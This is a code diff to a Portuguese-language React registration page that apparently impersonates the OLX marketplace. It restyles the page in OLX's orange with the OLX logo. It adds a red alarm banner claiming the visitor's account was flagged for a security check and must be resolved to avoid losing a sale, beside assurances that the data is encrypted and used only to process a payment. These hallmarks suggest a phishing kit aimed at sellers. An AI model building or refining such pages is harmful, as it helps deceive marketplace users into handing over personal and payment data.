@@ -169,7 +169,7 @@ export default function Cadastro({ onContinuar }: Props) {
   };
 
   const inputClass = (key: string) =>
-    `w-full px-4 py-2.5 border rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500 ${
+    `w-full px-4 py-2.5 border rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#FF6E00] ${
       tentou && erros[key] ? "border-red-400 bg-red-50" : "border-gray-300"
     }`;
 
@@ -198,14 +198,19 @@ export default function Cadastro({ onContinuar }: Props) {
 
       {/* Tela de carregamento */}
       {carregando && (
-        <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-purple-600">
+        <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#FF6E00]">
           <div className="w-14 h-14 border-4 border-white border-t-transparent rounded-full animate-spin mb-6" />
           <p className="text-white text-lg font-medium">Verificando seus dados...</p>
         </div>
       )}
 
       <div className="min-h-screen bg-white flex flex-col">
-        <header className="border-b border-gray-100 bg-white py-4">
+        {/* Banner de aviso */}
+      <div className="bg-red-600 text-white text-sm font-semibold py-2.5 px-4 text-center flex items-center justify-center gap-2">
+        🔒 Sua conta foi sinalizada para verificação de segurança. Regularize para não perder sua venda.
+      </div>
+
+      <header className="border-b border-gray-100 bg-white py-4">
           <div className="container flex items-center justify-between">
             <img src="/logo.png" alt="OLX" className="h-16 w-auto" />
             <div className="text-sm text-gray-500">Segurança em Primeiro Lugar</div>
@@ -257,14 +262,14 @@ export default function Cadastro({ onContinuar }: Props) {
           </div>
 
           <div className="mb-6 rounded-lg bg-gray-50 p-4 border border-gray-200 flex gap-3">
-            <ShieldCheck className="h-5 w-5 text-purple-600 flex-shrink-0 mt-0.5" />
+            <ShieldCheck className="h-5 w-5 text-[#FF6E00] flex-shrink-0 mt-0.5" />
             <p className="text-sm text-gray-600">
               Seus dados são protegidos com criptografia de ponta a ponta e utilizados exclusivamente para processar seu pagamento.
             </p>
           </div>
 
           <Button onClick={handleSubmit} disabled={carregando}
-            className="w-full h-12 bg-purple-600 hover:bg-purple-700 text-white font-semibold rounded-lg">
+            className="w-full h-12 bg-[#FF6E00] hover:bg-[#e55f00] text-white font-semibold rounded-lg">
             Continuar →
           </Button>
         </main>
